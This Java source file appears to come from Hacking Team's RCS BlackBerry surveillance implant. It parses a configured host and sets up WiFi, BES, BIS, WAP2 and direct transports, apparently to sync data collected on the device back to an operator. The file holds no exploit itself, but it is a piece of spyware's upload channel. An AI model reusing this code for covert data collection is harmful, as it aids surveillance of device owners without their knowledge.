//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SyncAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action.sync;

import java.io.EOFException;

import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.util.DataBuffer;
import blackberry.action.sync.transport.BesTransport;
import blackberry.action.sync.transport.BisTransport;
import blackberry.action.sync.transport.DirectTransport;
import blackberry.action.sync.transport.Wap2Transport;
import blackberry.action.sync.transport.WifiTransport;
import blackberry.config.ConfAction;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Check;
import blackberry.utils.WChar;

public class SyncActionInternet extends SyncAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("SyncActionInt", DebugLevel.VERBOSE);
    //#endif

    protected boolean wifiForced;

    protected boolean wifi;
    protected boolean gprs;
    protected boolean bis;
    protected boolean bes;
    protected boolean wap2;

    String host;

    public SyncActionInternet(final int actionId_, final byte[] confParams) {
        super(actionId_, confParams);

        //#ifdef DBC
        Check.requires(actionId == ACTION_SYNC_INTERNET, "Wrong ActionId");
        //#endif
    }

    public SyncActionInternet(ConfAction conf) {
        super(conf);
    }

    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            wifi = true;
            
            int dgprs = databuffer.readInt();
            int dwifi = databuffer.readInt();

            //#ifdef DEBUG
            debug.trace("parse gprs=" + dgprs + " wifi=" + dwifi);
            //#endif

            gprs = dgprs == 1;
            wifiForced = dwifi == 1;

            bis = gprs;
            bes = gprs;
            wap2 = gprs;

            final int len = databuffer.readInt();
            final byte[] buffer = new byte[len];
            databuffer.readFully(buffer);

            host = WChar.getString(buffer, true);

        } catch (final EOFException e) {
            //#ifdef DEBUG
            debug.error("params FAILED");
            //#endif
            return false;
        }

        //#ifdef DEBUG
        final StringBuffer sb = new StringBuffer();
        sb.append("gprs: " + gprs);
        sb.append(" wifi: " + wifi);
        sb.append(" wifiForced: " + wifiForced);
        sb.append(" host: " + host);
        debug.trace(sb.toString());
        //#endif

        return true;
    }

    //#ifdef DEBUG
    public String toString() {
        return "SyncInternet ";
    }
    //#endifS

    protected boolean initTransport() {
        if (wifi) {
            //#ifdef DEBUG
            debug.trace("initTransport adding WifiTransport");
            //#endif
            transports.addElement(new WifiTransport(host, wifiForced));
        }

        if (bes) {
            //#ifdef DEBUG
            debug.trace("initTransport adding BesTransport");
            //#endif
            transports.addElement(new BesTransport(host));
        }

        if (bis) {
            //#ifdef DEBUG
            debug.trace("initTransport adding BisTransport");
            //#endif
            transports.addElement(new BisTransport(host));
        }

        if (wap2) {
            //#ifdef DEBUG
            debug.trace("initTransport adding Wap2Transport");
            //#endif
            transports.addElement(new Wap2Transport(host));
        }

        if (gprs || DeviceInfo.isSimulator()) {
            //#ifdef DEBUG
            debug.trace("initTransport adding DirectTransport");
            //#endif
            transports.addElement(new DirectTransport(host));
        }

        return true;
    }

}
